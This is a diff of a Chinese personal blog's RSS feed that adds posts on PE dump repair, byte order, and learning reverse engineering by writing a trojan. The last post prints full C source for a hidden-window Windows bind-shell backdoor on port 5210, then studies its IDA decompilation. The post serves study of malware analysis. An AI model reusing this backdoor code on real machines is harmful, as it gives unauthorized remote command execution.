@@ -7,7 +7,7 @@
     <generator>Hugo -- gohugo.io</generator>
     <language>cn</language>
     <copyright>Copyright © 2019–2024</copyright>
-    <lastBuildDate>Fri, 20 Dec 2024 11:06:11 +0800</lastBuildDate>
+    <lastBuildDate>Thu, 19 Dec 2024 17:59:02 +0800</lastBuildDate>
     
 	<atom:link href="https://wander1ng.com/index.xml" rel="self" type="application/rss+xml" />
     
@@ -1501,6 +1501,172 @@ git push https://github.com/username/projectname master(main)
 &lt;p&gt;域名的CNAME要解析到项目的别名/Aliases，一键交给Cloudflare添加的CNAME可能不是实际的Aliases，需要手动修改DNS添加上master。&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20240705012026.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
 &lt;/li&gt;
+&lt;/ol&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>转储文件的修复原理</title>
+      <link>https://wander1ng.com/post/%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%AE%E5%A4%8D%E5%8E%9F%E7%90%86/</link>
+      <pubDate>Wed, 30 Dec 2020 12:27:23 +0800</pubDate>
+      
+      <guid>https://wander1ng.com/post/%E8%BD%AC%E5%82%A8%E6%96%87%E4%BB%B6%E7%9A%84%E4%BF%AE%E5%A4%8D%E5%8E%9F%E7%90%86/</guid>
+      <description>&lt;p&gt;​	对于多阶段释放的样本，可以扔进xdbg，在回连C2的函数下断。找到断下来的地址空间，不是shellcode的话就是一个完整的PE，如果是PE，直接dump出来，修复导入导出表后便能在IDA中分析。&lt;/p&gt;
+&lt;p&gt;​	看修复过程的操作主要涉及对VirtualAddress和Relative VirtualAddress的处理，顺便学习一下内存对齐的原理。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;对于内存空间的任意值， 有：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;VirtualAddress：进程虚拟内存的绝对地址。&lt;/p&gt;
+&lt;p&gt;RelativeAddress：从某个ImageBase开始的相对地址。&lt;/p&gt;
+&lt;p&gt;ImageBase+RVA=VirtualAddress。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;对于PE文件从磁盘到内存映射：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;由于PE文件在磁盘上和在内存中的对齐颗粒度不同，会导致同一个PE文件在磁盘上有两个不同的偏移。FOV：文件偏移，RVA内存偏移。&lt;/p&gt;
+&lt;p&gt;PE扩展头中定义了内存对齐颗粒度SectionAlignment和文件对齐颗粒度FileAlignment。&lt;/p&gt;
+&lt;p&gt;相互转换的方法：差值=RVA-节VirtualAddress(内存对齐值)，FOV=节PointerToData值(文件偏移对齐值)。&lt;/p&gt;
+&lt;h4 id=&#34;对齐&#34;&gt;对齐&lt;/h4&gt;
+&lt;p&gt;经典的文件对齐值：200h，X86内存对齐：1000h。&lt;/p&gt;
+&lt;p&gt;SectionAlignment定义了内存中区块的对齐值，PE文件被映射到内存中时，区块总是至少从一个页的边界开始。&lt;/p&gt;
+&lt;h4 id=&#34;对齐的原因&#34;&gt;对齐的原因&lt;/h4&gt;
+&lt;p&gt;现代计算机中内存空间都是按照字节(byte)进行划分的，所以从理论上讲对于任何类型的变量访问都可以从任意地址开始，但是在实际情况中，在访问特定类型变量的时候经常在特定的内存地址访问，所以这就需要把各种类型数据按照一定的规则在空间上排列，而不是按照顺序一个接一个的排放，这种就称为内存对齐，内存对齐是指首地址对齐，而不是说每个变量大小对齐。&lt;/p&gt;
+&lt;h4 id=&#34;对齐参数&#34;&gt;对齐参数&lt;/h4&gt;
+&lt;p&gt;即对齐的最小单位。假如对齐参数是8字节，那4字节的需要填充4字节00h到8字节，36字节需要填充4字节的00h到40字节。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>大端序与小端序</title>
+      <link>https://wander1ng.com/post/%E5%A4%A7%E7%AB%AF%E5%BA%8F%E4%B8%8E%E5%B0%8F%E7%AB%AF%E5%BA%8F/</link>
+      <pubDate>Sun, 20 Dec 2020 11:06:11 +0800</pubDate>
+      
+      <guid>https://wander1ng.com/post/%E5%A4%A7%E7%AB%AF%E5%BA%8F%E4%B8%8E%E5%B0%8F%E7%AB%AF%E5%BA%8F/</guid>
+      <description>&lt;p&gt;&lt;strong&gt;大端序&lt;/strong&gt;：高位字节在前(低地址)，低位字节在后(高地址)，属于人类读写数值的方法。&lt;/p&gt;
+&lt;p&gt;**小端序：**低位字节在前(低地址)，高位字节在后(高地址)，属于计算机读写数值的方式。&lt;/p&gt;
+&lt;h4 id=&#34;原因&#34;&gt;原因&lt;/h4&gt;
+&lt;p&gt;首先，为什么会有小端字节序？&lt;/p&gt;
+&lt;p&gt;答案是，计算机电路先处理低位字节，效率比较高，因为计算都是从低位开始的。所以，计算机的内部处理都是小端字节序。但是，人类还是习惯读写大端字节序。所以，除了计算机的内部处理，其他的场合几乎都是大端字节序，比如网络传输和文件储存。&lt;/p&gt;
+&lt;h4 id=&#34;处理方式&#34;&gt;处理方式&lt;/h4&gt;
+&lt;p&gt;一般字节序的问题由外部设备处理，即由从存储中进行读取的设备处理。&lt;/p&gt;
+&lt;p&gt;对于大端序：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;x = buf[offset]&amp;lt;&amp;lt;8 | buf[offset+1];&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;符合人类理解，低地址存放的高位乘以位数，或运算把低位加上去。&lt;/p&gt;
+&lt;p&gt;对于小端序：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;x = buf[offset+1] * 256 + buf[offset];&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;高地址存放的高位乘以位数，再把低地址存放的低位加上去。&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>从正向木马编写看逆向工程</title>
+      <link>https://wander1ng.com/post/%E4%BB%8E%E6%AD%A3%E5%90%91%E6%9C%A8%E9%A9%AC%E7%BC%96%E5%86%99%E7%9C%8B%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/</link>
+      <pubDate>Thu, 26 Nov 2020 20:11:59 +0800</pubDate>
+      
+      <guid>https://wander1ng.com/post/%E4%BB%8E%E6%AD%A3%E5%90%91%E6%9C%A8%E9%A9%AC%E7%BC%96%E5%86%99%E7%9C%8B%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B/</guid>
+      <description>&lt;p&gt;​	提高样本分析能力，最重要的事情之一就是先正向编写木马。之前简单编译过一个程序，今天搜了一个非常简单的后门，比较一下反编译的结果和源码的区别。&lt;/p&gt;
+&lt;p&gt;​	源码如下。&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;#pragma comment(lib,&amp;#34;ws2_32.lib&amp;#34;)  //这里我们静态加入一个lib文件，也就是ws2_32.lib&amp;lt;/font&amp;gt;
+
+#pragma comment(linker,&amp;#34;/subsystem:\&amp;#34;windows\&amp;#34;/entry:\&amp;#34;mainCRTStartup\&amp;#34;&amp;#34;) //设置连接器选项
+
+#include &amp;lt;winsock2.h&amp;gt; //包含头文件winsock2.h,这个是 windows socket的头文件
+
+#include &amp;lt;windows.h&amp;gt; //常用的，不解释
+
+#define MasterPort 5210 //定义一个常量，也就是我们后面要打开的端口
+
+main()   //主函数不解释
+{
+  WSADATA WSADa; //这个结构被用来存储被WSAStartup函数调用后返回的Windows Sockets数据。后面的基本上差不多就不解释，不懂请大家自行百度
+  sockaddr_in SockAddrIn; 
+  SOCKET CSocket,SSocket;
+  int iAddrSize;
+  PROCESS_INFORMATION ProcessInfo;
+  STARTUPINFO StartupInfo;
+  char szCMDPath[255];
+  
+  //分配内存，初始化数据
+  ZeroMemory(&amp;amp;ProcessInfo,sizeof(PROCESS_INFORMATION));
+  ZeroMemory(&amp;amp;StartupInfo,sizeof(STARTUPINFO));
+  ZeroMemory(&amp;amp;WSADa,sizeof(WSADATA));
+
+  //获取cmd路径
+  GetEnvironmentVariable(&amp;#34;COMSPEG&amp;#34;,szCMDPath,sizeof(szCMDPath));
+
+  //加载ws2_32.dll
+  WSAStartup(0x0202,&amp;amp;WSADa);
+
+  //设置本地信息和绑定协议,建立socket,代码如下:
+  SockAddrIn.sin_family = AF_INET;
+  SockAddrIn.sin_addr.s_addr = INADDR_ANY;
+  SockAddrIn.sin_port = htons(MasterPort);
+  CSocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,NULL,0,0);
+
+  //设置绑定端口，将SockAddrIn绑定到CSocket。
+  bind(CSocket,(sockaddr *)&amp;amp;SockAddrIn,sizeof(SockAddrIn));
+
+  //设置服务器端监听端口
+  listen(CSocket,1);
+  iAddrSize = sizeof(SockAddrIn);
+
+  //开始连接远程服务器，并配置隐藏窗口结构体
+  SSocket = accept(CSocket,(sockaddr *)&amp;amp;SockAddrIn,&amp;amp;iAddrSize);
+
+  StartupInfo.cb = sizeof(STARTUPINFO);
+
+  StartupInfo.wShowWindow = SW_HIDE;
+  
+  StartupInfo.dwFlags = STARTF_USESTDHANDLES |
+
+  STARTF_USESHOWWINDOW;
+
+  StartupInfo.hStdInput = (HANDLE)SSocket;
+
+  StartupInfo.hStdOutput = (HANDLE)SSocket;
+
+  StartupInfo.hStdError = (HANDLE)SSocket;
+  
+  //创建匿名管道：
+
+  CreateProcess(NULL, szCMDPath, NULL, NULL, TRUE, 0, NULL, NULL, &amp;amp;StartupInfo, &amp;amp;ProcessInfo);
+
+  WaitForSingleObject(ProcessInfo.hProcess, INFINITE);
+
+  CloseHandle(ProcessInfo.hProcess);
+
+  CloseHandle(ProcessInfo.hThread);
+
+ 
+
+  //关闭进程句柄：
+
+  closesocket(CSocket);
+
+  closesocket(SSocket);
+
+  WSACleanup();
+
+    //关闭连接卸载ws2_32.dll
+
+  return 0;
+
+  }
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;实际IDA反编译出来的效果如下：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/12/14579c8d6365d8c8ebbc49c59bfc8563.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到反编译的结果，库的导入和局部变量的定义是没有的，应该是编译过程中，在链接操作之前这些就已经执行完成了。&lt;/p&gt;
+&lt;p&gt;简单来说这个程序的功能就是开放5210端口，并监听。然后把输入重定向到新起cmd进程，并把cmd进程的输出重定向到5210端口。&lt;/p&gt;
+&lt;h5 id=&#34;对64位下传参的测试&#34;&gt;对64位下传参的测试&lt;/h5&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/12/4df417ee0c925a50506052e490c72dfa.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;传4个参数及以下，使用的是寄存器传参，cd89，第一个参数传到c，第二个参数传到d，第三个参数传到8，第四个参数传到9。从顺序上来看，从右往左，先从第四个开始传，再从第三个开始传&amp;hellip;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/12/7cfa50c168c605c3f3c348bc87cc3891.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;传5个参数及以上，前四个使用寄存器传参，从第五个开始使用堆栈传参(上图是传完了之后的结果，汇编侧可以看到寄存器的使用)。可以看到第五个参数先使用了寄存器将参数从rbp-14h中取出来(寻址方式。反映变化趋势的方面，栈由高地址向低地址生长，参数由低地址向高地址生长。x64dbg的上面是栈顶低地址下面是栈底高地址)。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/12/d8c9290af6a1335497314da67801034c.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;然后又赋给了rsp+20，最后把eax中存放的第一个参数赋给ecx。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;C:%5CUsers%5Clizhenxin%5CAppData%5CRoaming%5CLanxinSoftCustom%5CLxResource%5CImages%5C0880c08b0110ebe3d330.png&#34; alt=&#34;0880c08b0110ebe3d330&#34;&gt;&lt;/p&gt;
+&lt;p&gt;比较奇怪的是为什么不在栈顶。&lt;/p&gt;
+&lt;h5 id=&#34;基础知识&#34;&gt;基础知识&lt;/h5&gt;
+&lt;ol&gt;
+&lt;li&gt;StartupInfo结构体，主要用于创建新进程时，指定该进程的主窗口特性。主要指定窗口显示状态、窗口位置和大小、窗口标题和其他属性。&lt;/li&gt;
+&lt;li&gt;获取cmd的绝对路径可以使用GetEnvironmentVariableA(&amp;ldquo;COMSPEC&amp;rdquo;, Buffer, 0xFFu)。&lt;/li&gt;
+&lt;li&gt;C语言的强制类型转换：(typename)  expression，typename为新类型名称，expression为表达式。&lt;/li&gt;
+&lt;li&gt;返回地址的存储，因为是由主调函数进行的压栈操作，所以x64dbg的栈区分，将存储返回地址的部分算作上一个栈。&lt;/li&gt;
+&lt;li&gt;UTF-8 是 Unicode 的实现方式之一。&lt;/li&gt;
 &lt;/ol&gt;
 </description>
     </item>
